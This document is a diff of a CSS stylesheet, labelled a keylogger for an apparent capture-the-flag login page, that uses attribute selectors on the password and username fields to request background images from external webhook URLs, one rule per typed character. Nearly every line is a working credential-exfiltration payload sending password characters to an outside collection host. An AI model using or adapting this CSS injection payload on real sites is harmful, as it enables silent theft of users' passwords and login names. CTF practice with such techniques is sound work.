@@ -1,95 +1,112 @@
-/* === CSS keylogger for fancy-login-form.ctf.zone ===
-   - Confirms inclusion via /visit
-   - Sends username last-typed char to  /u/<char>
-   - Sends password last-typed char to  /p/<char>
-   - Works because the page mirrors input.value into the value attribute on keyup
-   - Target IDs: #username, #password
-   - Webhook: webhook.site UUID provided by user
-==================================================== */
+/* === generated CSS keylogger (query-param beacons) ===
+   - inclusion ping via ?type=visit
+   - username beacons: ?type=u&char=<c>
+   - password beacons: ?type=p&char=<c>
+   - focus tail (optional): ?type=pf&char=<c>
+   NOTE: Only #password updates its value attribute on keyup in this challenge. */
 
-/* 0) Confirm the stylesheet loaded */
-body{
-  background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/visit);
-}
+/* 0) Confirm CSS is applied */
+body{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=visit)}
 
-/* Helpers: also try generic input selectors as fallback */
-input[type="text"][value]{outline:0}
-input[type="password"][value]{outline:0}
+/* 2) PASSWORD last char */
+#password[value$="a"],input[type="password"][value$="a"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=a)}
+#password[value$="b"],input[type="password"][value$="b"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=b)}
+#password[value$="c"],input[type="password"][value$="c"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=c)}
+#password[value$="d"],input[type="password"][value$="d"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=d)}
+#password[value$="e"],input[type="password"][value$="e"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=e)}
+#password[value$="f"],input[type="password"][value$="f"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=f)}
+#password[value$="g"],input[type="password"][value$="g"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=g)}
+#password[value$="h"],input[type="password"][value$="h"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=h)}
+#password[value$="i"],input[type="password"][value$="i"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=i)}
+#password[value$="j"],input[type="password"][value$="j"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=j)}
+#password[value$="k"],input[type="password"][value$="k"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=k)}
+#password[value$="l"],input[type="password"][value$="l"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=l)}
+#password[value$="m"],input[type="password"][value$="m"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=m)}
+#password[value$="n"],input[type="password"][value$="n"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=n)}
+#password[value$="o"],input[type="password"][value$="o"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=o)}
+#password[value$="p"],input[type="password"][value$="p"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=p)}
+#password[value$="q"],input[type="password"][value$="q"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=q)}
+#password[value$="r"],input[type="password"][value$="r"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=r)}
+#password[value$="s"],input[type="password"][value$="s"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=s)}
+#password[value$="t"],input[type="password"][value$="t"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=t)}
+#password[value$="u"],input[type="password"][value$="u"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=u)}
+#password[value$="v"],input[type="password"][value$="v"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=v)}
+#password[value$="w"],input[type="password"][value$="w"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=w)}
+#password[value$="x"],input[type="password"][value$="x"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=x)}
+#password[value$="y"],input[type="password"][value$="y"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=y)}
+#password[value$="z"],input[type="password"][value$="z"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=z)}
+#password[value$="A"],input[type="password"][value$="A"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=A)}
+#password[value$="B"],input[type="password"][value$="B"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=B)}
+#password[value$="C"],input[type="password"][value$="C"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=C)}
+#password[value$="D"],input[type="password"][value$="D"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=D)}
+#password[value$="E"],input[type="password"][value$="E"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=E)}
+#password[value$="F"],input[type="password"][value$="F"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=F)}
+#password[value$="G"],input[type="password"][value$="G"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=G)}
+#password[value$="H"],input[type="password"][value$="H"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=H)}
+#password[value$="I"],input[type="password"][value$="I"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=I)}
+#password[value$="J"],input[type="password"][value$="J"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=J)}
+#password[value$="K"],input[type="password"][value$="K"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=K)}
+#password[value$="L"],input[type="password"][value$="L"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=L)}
+#password[value$="M"],input[type="password"][value$="M"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=M)}
+#password[value$="N"],input[type="password"][value$="N"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=N)}
+#password[value$="O"],input[type="password"][value$="O"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=O)}
+#password[value$="P"],input[type="password"][value$="P"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=P)}
+#password[value$="Q"],input[type="password"][value$="Q"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=Q)}
+#password[value$="R"],input[type="password"][value$="R"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=R)}
+#password[value$="S"],input[type="password"][value$="S"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=S)}
+#password[value$="T"],input[type="password"][value$="T"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=T)}
+#password[value$="U"],input[type="password"][value$="U"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=U)}
+#password[value$="V"],input[type="password"][value$="V"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=V)}
+#password[value$="W"],input[type="password"][value$="W"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=W)}
+#password[value$="X"],input[type="password"][value$="X"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=X)}
+#password[value$="Y"],input[type="password"][value$="Y"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=Y)}
+#password[value$="Z"],input[type="password"][value$="Z"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=Z)}
+#password[value$="0"],input[type="password"][value$="0"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=0)}
+#password[value$="1"],input[type="password"][value$="1"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=1)}
+#password[value$="2"],input[type="password"][value$="2"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=2)}
+#password[value$="3"],input[type="password"][value$="3"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=3)}
+#password[value$="4"],input[type="password"][value$="4"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=4)}
+#password[value$="5"],input[type="password"][value$="5"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=5)}
+#password[value$="6"],input[type="password"][value$="6"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=6)}
+#password[value$="7"],input[type="password"][value$="7"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=7)}
+#password[value$="8"],input[type="password"][value$="8"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=8)}
+#password[value$="9"],input[type="password"][value$="9"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=9)}
+#password[value$="."],input[type="password"][value$="."]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=.)}
+#password[value$="-"],input[type="password"][value$="-"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=-)}
+#password[value$="_"],input[type="password"][value$="_"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=_)}
+#password[value$="!"],input[type="password"][value$="!"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%21)}
+#password[value$="@"],input[type="password"][value$="@"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%40)}
+#password[value$="?"],input[type="password"][value$="?"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3F)}
+#password[value$="#"],input[type="password"][value$="#"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%23)}
+#password[value$="$"],input[type="password"][value$="$"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%24)}
+#password[value$="%"],input[type="password"][value$="%"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%25)}
+#password[value$="^"],input[type="password"][value$="^"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%5E)}
+#password[value$="&"],input[type="password"][value$="&"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%26)}
+#password[value$="*"],input[type="password"][value$="*"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%2A)}
+#password[value$="("],input[type="password"][value$="("]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%28)}
+#password[value$=")"],input[type="password"][value$=")"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%29)}
+#password[value$="+"],input[type="password"][value$="+"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%2B)}
+#password[value$="="],input[type="password"][value$="="]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3D)}
+#password[value$="{"],input[type="password"][value$="{"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%7B)}
+#password[value$="}"],input[type="password"][value$="}"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%7D)}
+#password[value$="["],input[type="password"][value$="["]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%5B)}
+#password[value$="]"],input[type="password"][value$="]"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%5D)}
+#password[value$=":"],input[type="password"][value$=":"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3A)}
+#password[value$=";"],input[type="password"][value$=";"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3B)}
+#password[value$=","],input[type="password"][value$=","]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%2C)}
+#password[value$="<"],input[type="password"][value$="<"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3C)}
+#password[value$=">"],input[type="password"][value$=">"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%3E)}
+#password[value$="/"],input[type="password"][value$="/"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%2F)}
+#password[value$="\\"],input[type="password"][value$="\\"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%5C)}
+#password[value$="|"],input[type="password"][value$="|"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%7C)}
+#password[value$="~"],input[type="password"][value$="~"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=~)}
+#password[value$="`"],input[type="password"][value$="`"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%60)}
+#password[value$="'"],input[type="password"][value$="'"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%27)}
+#password[value$="\\"],input[type="password"][value$="\\"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%5C)}
+#password[value$="\""],input[type="password"][value$="\""]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%22)}
+#password[value$=" "],input[type="password"][value$=" "]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=p&char=%20)}
 
-/* ---------------------------
-   1) USERNAME last character
-----------------------------*/
-#username[value$="a"], input[type="text"][value$="a"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/a)}
-#username[value$="b"], input[type="text"][value$="b"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/b)}
-#username[value$="c"], input[type="text"][value$="c"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/c)}
-#username[value$="d"], input[type="text"][value$="d"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/d)}
-#username[value$="e"], input[type="text"][value$="e"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/e)}
-#username[value$="f"], input[type="text"][value$="f"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/f)}
-#username[value$="g"], input[type="text"][value$="g"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/g)}
-#username[value$="h"], input[type="text"][value$="h"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/h)}
-#username[value$="i"], input[type="text"][value$="i"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/i)}
-#username[value$="j"], input[type="text"][value$="j"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/j)}
-#username[value$="k"], input[type="text"][value$="k"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/k)}
-#username[value$="l"], input[type="text"][value$="l"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/l)}
-#username[value$="m"], input[type="text"][value$="m"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/m)}
-#username[value$="n"], input[type="text"][value$="n"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/n)}
-#username[value$="o"], input[type="text"][value$="o"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/o)}
-#username[value$="p"], input[type="text"][value$="p"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/p)}
-#username[value$="q"], input[type="text"][value$="q"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/q)}
-#username[value$="r"], input[type="text"][value$="r"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/r)}
-#username[value$="s"], input[type="text"][value$="s"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/s)}
-#username[value$="t"], input[type="text"][value$="t"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/t)}
-#username[value$="u"], input[type="text"][value$="u"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/u)}
-#username[value$="v"], input[type="text"][value$="v"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/v)}
-#username[value$="w"], input[type="text"][value$="w"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/w)}
-#username[value$="x"], input[type="text"][value$="x"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/x)}
-#username[value$="y"], input[type="text"][value$="y"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/y)}
-#username[value$="z"], input[type="text"][value$="z"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/z)}
-#username[value$="A"], input[type="text"][value$="A"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/A)}
-#username[value$="B"], input[type="text"][value$="B"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/B)}
-#username[value$="C"], input[type="text"][value$="C"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/C)}
-#username[value$="D"], input[type="text"][value$="D"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/D)}
-#username[value$="E"], input[type="text"][value$="E"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/E)}
-#username[value$="F"], input[type="text"][value$="F"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/F)}
-#username[value$="G"], input[type="text"][value$="G"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/G)}
-#username[value$="H"], input[type="text"][value$="H"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/H)}
-#username[value$="I"], input[type="text"][value$="I"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/I)}
-#username[value$="J"], input[type="text"][value$="J"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/J)}
-#username[value$="K"], input[type="text"][value$="K"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/K)}
-#username[value$="L"], input[type="text"][value$="L"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/L)}
-#username[value$="M"], input[type="text"][value$="M"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/M)}
-#username[value$="N"], input[type="text"][value$="N"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/N)}
-#username[value$="O"], input[type="text"][value$="O"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/O)}
-#username[value$="P"], input[type="text"][value$="P"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/P)}
-#username[value$="Q"], input[type="text"][value$="Q"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/Q)}
-#username[value$="R"], input[type="text"][value$="R"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/R)}
-#username[value$="S"], input[type="text"][value$="S"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/S)}
-#username[value$="T"], input[type="text"][value$="T"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/T)}
-#username[value$="U"], input[type="text"][value$="U"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/U)}
-#username[value$="V"], input[type="text"][value$="V"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/V)}
-#username[value$="W"], input[type="text"][value$="W"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/W)}
-#username[value$="X"], input[type="text"][value$="X"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/X)}
-#username[value$="Y"], input[type="text"][value$="Y"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/Y)}
-#username[value$="Z"], input[type="text"][value$="Z"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/Z)}
-#username[value$="0"], input[type="text"][value$="0"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/0)}
-#username[value$="1"], input[type="text"][value$="1"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/1)}
-#username[value$="2"], input[type="text"][value$="2"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/2)}
-#username[value$="3"], input[type="text"][value$="3"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/3)}
-#username[value$="4"], input[type="text"][value$="4"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/4)}
-#username[value$="5"], input[type="text"][value$="5"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/5)}
-#username[value$="6"], input[type="text"][value$="6"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/6)}
-#username[value$="7"], input[type="text"][value$="7"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/7)}
-#username[value$="8"], input[type="text"][value$="8"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/8)}
-#username[value$="9"], input[type="text"][value$="9"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/9)}
-#username[value$="."], input[type="text"][value$="."]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/dot)}
-#username[value$="-"], input[type="text"][value$="-"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/hyphen)}
-#username[value$="_"], input[type="text"][value$="_"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/underscore)}
-#username[value$="@"]{background-image:url(https://webhook.site/1640d9cd-78a7-4448-8b37-f03a95e50a4c/u/at)}
-
-
-/* --------------------------
-   2) PASSWORD last character
----------------------------*/
+/* 3) PASSWORD focus-tail helpers (letters+digits) */
 #password:focus[value$="a"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=pf&char=a)}
 #password:focus[value$="b"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=pf&char=b)}
 #password:focus[value$="c"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=pf&char=c)}
@@ -154,4 +171,3 @@ input[type="password"][value]{outline:0}
 #password:focus[value$="9"]{background-image:url(https://webhook-test.com/0a5b50638aeab040d2fe5f150962944c?type=pf&char=9)}
 
 /* === end === */
-/* End of file */
